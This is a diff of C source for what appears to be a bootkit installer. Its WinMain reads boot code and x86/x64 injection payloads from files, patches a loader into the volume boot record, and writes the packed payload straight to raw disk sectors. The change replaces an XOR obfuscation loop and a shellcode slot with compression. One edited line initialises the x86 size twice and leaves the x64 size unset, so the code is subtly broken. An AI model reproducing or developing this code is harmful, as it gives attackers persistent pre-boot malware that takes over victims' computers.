@@ -180,21 +180,20 @@ int APIENTRY WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PCHAR pCmdLine,
 	CHSS BkChss;
 	CHSS NewChss;
 	ULONG ulError;
-	LDRDRV x86LdrDrv;
-	LDRDRV x64LdrDrv;
-	PCHAR pInjectX86Sys;
-	PCHAR pInjectX64Sys;
-	ULONG ulX86SysSize;
-	ULONG ulX64SysSize;
+	LDRDRV x86LdrCode;
+	LDRDRV x64LdrCode;
+	PCHAR pInjectX86Code;
+	PCHAR pInjectX64Code;
+	PCHAR pCompressedDat;
+	ULONG ulX86CodeSize;
+	ULONG ulX64CodeSize;
 	ULONG ulTotalSize;
 	PCHAR pSysDat;
 	ULONG ulSize;
 	ULONG uli;
 	ULONG ulXored;
 	ULONG ulOffset;
-	PCHAR pShellCode;
-	ULONG ulShellCodeSize;
-	LDRDRV ShellCodeDrv;
+	ULONG ulCompressedDatSize;
 	CHAR ShowMsgA[MAX_PATH];
 
 	pVbrDat = NULL;
@@ -203,10 +202,10 @@ int APIENTRY WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PCHAR pCmdLine,
 	ulBootCodeSize = 0;
 	ulRetBytesSize = 0;
 	ulError = 0;
-	pInjectX86Sys = NULL;
-	pInjectX64Sys = NULL;
-	ulX86SysSize = 0;
-	ulX64SysSize = 0;
+	pInjectX86Code = NULL;
+	pInjectX64Code = NULL;
+	ulX86CodeSize = 0;
+	ulX86CodeSize = 0;
 	ulTotalSize = 0;
 	pSysDat = NULL;
 	ulSize = 0;
@@ -214,19 +213,18 @@ int APIENTRY WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PCHAR pCmdLine,
 	ulOffset = 0;
 	pPacked = NULL;
 	ulPackedSize = 0;
-	ulShellCodeSize = 0;
-	pShellCode = NULL;
+	pCompressedDat = NULL;
+	ulCompressedDatSize = 0;
 	RtlZeroMemory(ShowMsgA,sizeof(CHAR) * MAX_PATH);
 
 
 	switch (__argc)
 	{
-	case 7:
-		if (GetFileDat(__argv[4],&pInjectX86Sys,&ulX86SysSize) && \
-			GetFileDat(__argv[5],&pInjectX64Sys,&ulX64SysSize) && \
-			GetFileDat(__argv[6],&pShellCode,&ulShellCodeSize))
+	case 6:
+		if (GetFileDat(__argv[4],&pInjectX86Code,&ulX86CodeSize) && \
+			GetFileDat(__argv[5],&pInjectX64Code,&ulX64CodeSize))
 		{
-			ulTotalSize = sizeof(LDRDRV) * 4 + ulX86SysSize + ulX64SysSize + ulShellCodeSize;
+			ulTotalSize = sizeof(LDRDRV) * 3 + ulX86CodeSize + ulX64CodeSize;
 			if (ulTotalSize % 0x400)
 			{
 				ulTotalSize = ((ulTotalSize / 0x400) + 1) * 0x400;
@@ -237,28 +235,21 @@ int APIENTRY WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PCHAR pCmdLine,
 			} while (NULL == pSysDat);
 			RtlZeroMemory(pSysDat,ulTotalSize);
 
-			x86LdrDrv.ulSignature = 'XD86';
-			x86LdrDrv.ulLength = ulX86SysSize;
-			x86LdrDrv.ulOffset = sizeof(x86LdrDrv) * 4;
-			x86LdrDrv.ulXor = 0;
+			x86LdrCode.ulSignature = 'XD86';
+			x86LdrCode.ulLength = ulX86CodeSize;
+			x86LdrCode.ulOffset = sizeof(LDRDRV) * 3;
+			x86LdrCode.ulXor = 0;
 
-			x64LdrDrv.ulSignature = 'XD64';
-			x64LdrDrv.ulLength = ulX64SysSize;
-			x64LdrDrv.ulOffset = sizeof(LDRDRV) * 4 + ulX86SysSize;
-			x64LdrDrv.ulXor = 0;
+			x64LdrCode.ulSignature = 'XD64';
+			x64LdrCode.ulLength = ulX64CodeSize;
+			x64LdrCode.ulOffset = sizeof(LDRDRV) * 3 + ulX86CodeSize;
+			x64LdrCode.ulXor = 0;
 
-			ShellCodeDrv.ulSignature = 'XDSD';
-			ShellCodeDrv.ulLength = ulShellCodeSize;
-			ShellCodeDrv.ulOffset = sizeof(LDRDRV) * 4 + ulX86SysSize + ulX64SysSize;
-			ShellCodeDrv.ulXor = 0;
+			RtlCopyMemory(pSysDat,&x86LdrCode,sizeof(LDRDRV));
+			RtlCopyMemory((PCHAR)((ULONG)pSysDat + sizeof(LDRDRV)),&x64LdrCode,sizeof(LDRDRV));
 
-			RtlCopyMemory(pSysDat,&x86LdrDrv,sizeof(LDRDRV));
-			RtlCopyMemory((PCHAR)((ULONG)pSysDat + sizeof(LDRDRV)),&x64LdrDrv,sizeof(LDRDRV));
-			RtlCopyMemory((PCHAR)((ULONG)pSysDat + sizeof(LDRDRV) * 2),&ShellCodeDrv,sizeof(LDRDRV));
-
-			RtlCopyMemory((PCHAR)((ULONG)pSysDat + sizeof(LDRDRV) * 4),pInjectX86Sys,ulX86SysSize);
-			RtlCopyMemory((PCHAR)((ULONG)pSysDat + sizeof(LDRDRV) * 4 + ulX86SysSize),pInjectX64Sys,ulX64SysSize);
-			RtlCopyMemory((PCHAR)((ULONG)pSysDat + sizeof(LDRDRV) * 4 + ulX64SysSize),pShellCode,ulShellCodeSize);
+			RtlCopyMemory((PCHAR)((ULONG)pSysDat + sizeof(LDRDRV) * 3),pInjectX86Code,ulX86CodeSize);
+			RtlCopyMemory((PCHAR)((ULONG)pSysDat + sizeof(LDRDRV) * 3 + ulX86CodeSize),pInjectX64Code,ulX64CodeSize);
 
 		}
 		if (GetFileDat(__argv[2],&pBootCode,&ulBootCodeSize))
@@ -289,9 +280,7 @@ int APIENTRY WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PCHAR pCmdLine,
 			ulOffset = GetCodeOffset((PUCHAR)((ULONG)pVbrDat + BIOS_DEFAULT_SECTOR_SIZE));
 			SetFilePointer(hVbr,ulOffset + BIOS_DEFAULT_SECTOR_SIZE,NULL,FILE_BEGIN);
 			RtlZeroMemory(&BkChss,sizeof(CHSS));
-			BkChss.lStartSector.QuadPart = 0x0B;
-			BkChss.uNumberSectors = (USHORT)(ulTotalSize / 0x400);
-			BkChss.ulXorValue = GetTickCount();
+
 			if (!MakeLoader(pBootCode, \
 				ulBootCodeSize, \
 				(PCHAR)((ULONG)pVbrDat + BIOS_DEFAULT_SECTOR_SIZE + ulOffset), \
@@ -314,18 +303,28 @@ int APIENTRY WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PCHAR pCmdLine,
 			{
 				return 0;
 			}
-			ulSize = ulTotalSize / sizeof(ULONG);
-			for (uli = 0;uli < (ulTotalSize / sizeof(ULONG));uli++)
-			{
-				ulXored = ((PULONG)pSysDat)[uli];
-				ulXored = _rotl((ulXored + ulSize) ^ BkChss.ulXorValue,ulSize);
-				((PULONG)pSysDat)[uli] = ulXored;
-				ulSize -= 1;
-			}
+			//ulSize = ulTotalSize / sizeof(ULONG);
+			//for (uli = 0;uli < (ulTotalSize / sizeof(ULONG));uli++)
+			//{
+			//	ulXored = ((PULONG)pSysDat)[uli];
+			//	ulXored = _rotl((ulXored + ulSize) ^ BkChss.ulXorValue,ulSize);
+			//	((PULONG)pSysDat)[uli] = ulXored;
+			//	ulSize -= 1;
+			//}
 			if (ulPackedSize % 0x200)
 			{
 				ulPackedSize = ((ulPackedSize / 0x200) + 1) * 0x200;
 			}
+
+			ulCompressedDatSize = ApPack(pSysDat,ulTotalSize,&pCompressedDat);
+			if (ulCompressedDatSize % 0x200)
+			{
+				ulCompressedDatSize = ((ulCompressedDatSize / 0x200) + 1) * 0x200;
+			}
+			BkChss.lStartSector.QuadPart = 0x0B;
+			BkChss.uNumberSectors = (USHORT)(ulCompressedDatSize / 0x400);
+			BkChss.ulXorValue = GetTickCount();
+
 			for (uli = 0;uli < ulBootCodeSize;uli++)
 			{
 				if (pBootCode[uli] == (CHAR)0x55 && (*(PULONG)(&pBootCode[uli]) == 0x55555555))
@@ -336,9 +335,8 @@ int APIENTRY WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PCHAR pCmdLine,
 			NewChss.lStartSector.QuadPart = BkChss.lStartSector.QuadPart + (BkChss.uNumberSectors * 0x400 / 0x200) + 1;
 			NewChss.uNumberSectors = (USHORT)ulPackedSize/0x200;
 			RtlCopyMemory(pBootCode + uli,&NewChss,sizeof(CHSS));
-
 			SetFilePointer(hDisk,BkChss.lStartSector.LowPart * BIOS_DEFAULT_SECTOR_SIZE,NULL,FILE_BEGIN);
-			if (FALSE == WriteFile(hDisk,pSysDat,ulTotalSize,&ulRetBytesSize,NULL))
+			if (FALSE == WriteFile(hDisk,pCompressedDat,ulCompressedDatSize,&ulRetBytesSize,NULL))
 			{
 				StringCchPrintfA(ShowMsgA,MAX_PATH,"Write Sector Failed,Offset:%08x",BkChss.lStartSector.LowPart);
 				OutputDebugStringA(ShowMsgA);
